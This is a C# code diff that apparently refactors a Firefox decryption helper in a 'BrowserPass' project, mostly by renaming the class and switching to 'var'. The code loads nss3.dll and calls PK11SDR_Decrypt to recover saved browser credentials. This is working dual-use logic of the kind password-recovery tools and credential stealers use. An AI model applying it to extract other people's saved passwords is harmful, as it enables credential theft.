@@ -7,7 +7,7 @@ namespace BrowserPass
     /// <summary>
     /// Firefox helper class
     /// </summary>
-    static class FFDecryptor
+    internal static class FfDecryptor
     {
         [DllImport("kernel32.dll")]
         public static extern IntPtr LoadLibrary(string dllFilePath);
@@ -29,25 +29,25 @@ namespace BrowserPass
 
             LoadLibrary(mozillaPath + "mozglue.dll");
             NSS3 = LoadLibrary(mozillaPath + "nss3.dll");
-            IntPtr pProc = GetProcAddress(NSS3, "NSS_Init");
-            DLLFunctionDelegate dll = (DLLFunctionDelegate)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate));
+            var pProc = GetProcAddress(NSS3, "NSS_Init");
+            var dll = (DLLFunctionDelegate)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate));
             return dll(configdir);
         }
 
         public static string Decrypt(string cypherText)
         {
-            IntPtr ffDataUnmanagedPointer = IntPtr.Zero;
-            StringBuilder sb = new StringBuilder(cypherText);
+            var ffDataUnmanagedPointer = IntPtr.Zero;
+            var sb = new StringBuilder(cypherText);
 
             try
             {
-                byte[] ffData = Convert.FromBase64String(cypherText);
+                var ffData = Convert.FromBase64String(cypherText);
 
                 ffDataUnmanagedPointer = Marshal.AllocHGlobal(ffData.Length);
                 Marshal.Copy(ffData, 0, ffDataUnmanagedPointer, ffData.Length);
 
-                TSECItem tSecDec = new TSECItem();
-                TSECItem item = new TSECItem();
+                var tSecDec = new TSECItem();
+                var item = new TSECItem();
                 item.SECItemType = 0;
                 item.SECItemData = ffDataUnmanagedPointer;
                 item.SECItemLen = ffData.Length;
@@ -56,7 +56,7 @@ namespace BrowserPass
                 {
                     if (tSecDec.SECItemLen != 0)
                     {
-                        byte[] bvRet = new byte[tSecDec.SECItemLen];
+                        var bvRet = new byte[tSecDec.SECItemLen];
                         Marshal.Copy(tSecDec.SECItemData, bvRet, 0, tSecDec.SECItemLen);
                         return Encoding.ASCII.GetString(bvRet);
                     }
@@ -84,8 +84,8 @@ namespace BrowserPass
         public delegate int DLLFunctionDelegate5(ref TSECItem data, ref TSECItem result, int cx);
         public static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
         {
-            IntPtr pProc = GetProcAddress(NSS3, "PK11SDR_Decrypt");
-            DLLFunctionDelegate5 dll = (DLLFunctionDelegate5)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate5));
+            var pProc = GetProcAddress(NSS3, "PK11SDR_Decrypt");
+            var dll = (DLLFunctionDelegate5)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate5));
             return dll(ref data, ref result, cx);
         }
 
